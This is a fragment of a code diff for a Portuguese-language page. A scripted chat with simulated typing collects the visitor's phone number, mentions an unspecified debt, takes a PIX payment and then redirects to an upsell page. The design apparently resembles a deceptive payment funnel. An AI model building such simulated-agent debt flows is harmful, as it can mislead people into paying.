+                        padding: 12px 24px;
+                        border-radius: 4px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        width: 100%;
+                        font-size: 1rem;
+                    "
+                >
+                    Confirmar Telefone
+                </button>
+            </div>
+        </div>
+    `;
+    
+    chatContainer.insertAdjacentHTML('beforeend', phoneInputHtml);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+    
+    // Focus on input
+    setTimeout(() => {
+        document.getElementById('phoneInput').focus();
+    }, 500);
+}
+
+// Wait for phone confirmation
+function waitForPhoneConfirmation() {
+    return new Promise(resolve => {
+        phoneConfirmationResolve = resolve;
+    });
+}
+
+// Confirm phone number
+async function confirmPhone() {
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneNumber = phoneInput.value.trim();
+    
+    if (phoneNumber.length < 10 || phoneNumber.length > 11) {
+        alert('Por favor, digite um número de telefone válido (DDD + número).');
+        return;
+    }
+    
+    // Save phone to localStorage
+    const currentData = JSON.parse(localStorage.getItem('customerData') || '{}');
+    currentData.telefone = phoneNumber;
+    localStorage.setItem('customerData', JSON.stringify(currentData));
+    
+    // Add user response to chat
+    addMessage(`Telefone: ${phoneNumber}`, false, true);
+    
+    // Remove phone input form
+    const phoneContainer = document.querySelector('.phone-input-container');
+    if (phoneContainer) {
+        phoneContainer.remove();
+    }
+    
+    // Show typing and thank message
+    await showTyping(3000);
+    addMessage(`Obrigada, ${firstName}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
+    
+    // Resolve the promise to continue chat
+    if (phoneConfirmationResolve) {
+        phoneConfirmationResolve();
+        phoneConfirmationResolve = null;
+    }
+}
+
+// Start chat when page loads
+document.addEventListener('DOMContentLoaded', initializeChat);
+
+
+// Function to show manual payment confirmation popup
+function showManualPaymentConfirmation(gatewayId) {
+    // Check if PIX modal is still visible
+    const pixModal = document.getElementById('pixModal');
+    if (!pixModal) {
+        return;
+    }
+    
+    
+    const confirmationPopup = `
+        <div id="paymentConfirmationPopup" style="
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            z-index: 3000;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            animation: popupFadeIn 0.3s ease-out;
+        ">
+            <h3 style="color: #1B3A6B; font-weight: 600; margin-bottom: 20px; font-size: 1.2rem;">
+                Confirmação de Pagamento
+            </h3>
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
+                Você já realizou o pagamento via PIX?
+            </p>
+            <div style="display: flex; gap: 15px; justify-content: center;">
+                <button onclick="handlePaymentConfirmation('${gatewayId}', true)" style="
+                    background: #28a745;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-size: 1rem;
+                ">
+                    Sim
+                </button>
+                <button onclick="handlePaymentConfirmation('${gatewayId}', false)" style="
+                    background: #dc3545;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-size: 1rem;
+                ">
+                    Não
+                </button>
+            </div>
+        </div>
+        <div id="paymentConfirmationOverlay" style="
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 2999;
+        "></div>
+        <style>
+        @keyframes popupFadeIn {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+        </style>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', confirmationPopup);
+}
+
+// Function to handle manual payment confirmation
+async function handlePaymentConfirmation(gatewayId, confirmed) {
+    const popup = document.getElementById('paymentConfirmationPopup');
+    const overlay = document.getElementById('paymentConfirmationOverlay');
+    if (popup) popup.remove();
+    if (overlay) overlay.remove();
+    
+    if (confirmed) {
+        try {
+            const statusUrl = `/check-payment/${gatewayId}`;
+            const response = await fetch(statusUrl);
+            
+            if (!response.ok) {
+                console.error(`Erro HTTP ${response.status}: ${response.statusText}`);
+                return;
+            }
+            
+            const statusData = await response.json();
+            
+            if (statusData.status === 'paid' || statusData.status === 'approved' || statusData.status === 'completed') {
+                if (window.paymentMonitorInterval) {
+                    clearInterval(window.paymentMonitorInterval);
+                    window.paymentMonitorInterval = null;
+                }
+                closePixModal();
+                window.location.href = '/upsell1';
+            } else {
+                alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
+            }
+        } catch (error) {
+            console.error('Erro ao verificar status manual:', error);
+            alert('Erro ao verificar pagamento. Tente novamente.');
+        }
+    }
+}
+</script>
+
+</body>
+</html>
